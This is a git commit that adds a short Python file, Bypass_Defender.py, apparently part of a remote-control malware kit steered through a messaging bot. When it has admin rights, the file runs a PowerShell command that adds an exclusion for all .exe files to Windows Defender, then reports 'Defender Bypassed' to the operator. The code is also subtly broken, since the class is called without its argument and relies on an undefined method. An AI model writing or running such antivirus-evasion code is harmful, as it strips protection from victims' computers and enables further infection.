d7ca81d497d133300dba578de6cc6702ab4bbbdd
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-06-01 11:56:44 +0200

    Add files via upload

---
+++ Bypass_Defender.py
@@ -0,0 +1,16 @@
+import os, ctypes, requests , getpass, sys
+class Bypass_Defender():
+	def __init__(self,_):
+		self._ = _
+		self.Main()
+
+		self.token = sys.argv[1]
+		self.chat_id = sys.argv[2]
+
+		if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+			os.system("powershell.exe -c \"Add-MpPreference -ExclusionExtension '.exe';\"")
+			self._.Send_Message("✔ Defender Bypassed.")
+		else:
+			self._.Send_Message("✖️ Need Admin Permissions.")
+
+Bypass_Defender()
